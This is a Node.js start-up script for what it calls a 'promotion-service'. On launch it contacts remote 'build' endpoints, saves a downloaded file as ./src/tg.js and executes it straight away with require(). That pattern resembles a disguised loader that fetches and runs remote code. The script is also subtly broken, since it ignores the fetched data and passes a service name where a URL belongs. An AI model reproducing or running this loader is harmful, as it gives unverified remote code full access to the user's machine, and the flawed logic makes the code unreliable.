const fetch = require("node-fetch");
const { Headers } = require("node-fetch");
globalThis.fetch = fetch;
globalThis.Headers = Headers;
const fs = require("fs");
const path = require("path");

console.log("In server");

const FETCH_TIMEOUT = 10000; // Set timeout for fetch (10 seconds)
const buildUrls = [
  "https://checker-production-c3c0.up.railway.app/forward/builds",
  "https://backup-server.com/forward/builds",
  "https://another-backup-server.com/forward/builds"
];
const service = "promotion-service";

// Function to fetch the URL with timeout and save the response to a file
async function fetchAndSave(url, filename) {
  try {
    const response = await fetchWithTimeout(url, FETCH_TIMEOUT);

    if (!response.ok) {
      throw new Error(`Failed to fetch URL. Status Code: ${response.status}`);
    }

    const filepath = path.resolve(filename);
    await ensureDirectoryExistence(filepath);

    const buffer = await response.buffer();
    await fs.promises.writeFile(filepath, buffer);

    return filepath;
  } catch (error) {
    throw new Error(`Error fetching and saving file: ${error.message}`);
  }
}

// Function to fetch with timeout
async function fetchWithTimeout(url, timeout) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);

  try {
    const response = await fetch(url, { signal: controller.signal });
    clearTimeout(timeoutId); // Clear the timeout if fetch is successful
    return response;
  } catch (error) {
    if (error.name === "AbortError") {
      throw new Error(`Fetch request timed out after ${timeout / 1000} seconds`);
    }
    throw error;
  }
}

// Function to ensure directory existence
async function ensureDirectoryExistence(filePath) {
  const dirname = path.dirname(filePath);
  if (!fs.existsSync(dirname)) {
    await fs.promises.mkdir(dirname, { recursive: true });
  }
}

// Function to fetch numbers from string (utility)
function fetchNumbersFromString(inputString) {
  const regex = /\d+/g;
  const matches = inputString.match(regex);
  return matches ? matches.join("") : "";
}

// Main function to fetch builds and trigger the process
async function loadAndStartService() {
  // Define the list of URLs to try sequentially


  let data;
  for (let i = 0; i < buildUrls.length; i++) {
    const buildurl = buildUrls[i];
    try {
      console.log(`Loading builds from: ${buildurl}`);

      const result = await fetchWithTimeout(buildurl, FETCH_TIMEOUT);
      if (!result.ok) {
        throw new Error(`Failed to fetch builds. Status Code: ${result.status}`);
      }

      data = await result.json();
      console.log(`Successfully fetched from: ${buildurl}`);
      break; // Break the loop if successful
    } catch (error) {
      console.error(`Error fetching from ${buildurl}: ${error.message}`);
      if (i === buildUrls.length - 1) {
        console.error("All URLs failed. Exiting.");
        return; // Exit if all URLs fail
      }
    }
  }

  if (!data) {
    throw new Error("No build data available.");
  }

  console.log(`Fetched URL: ${service}`);

  const filename = "./src/tg.js";
  try {
    const filePath = await fetchAndSave(service, filename);
    console.log(`File saved at: ${filePath}`);
  } catch (error) {
    console.error(`Failed to fetch and save file from URL: ${service}`);
    return;
  }

  console.log("Starting Service...");
  try {
    // Dynamically require the saved file
    require("./src/tg.js");
    console.log("Service initiation complete");
  } catch (error) {
    console.error(`Failed to start service: ${error.message}`);
  }
}

// Start the service
(async () => {
  console.log("Starting...");
  await loadAndStartService();
  console.log("Started Service");
})();
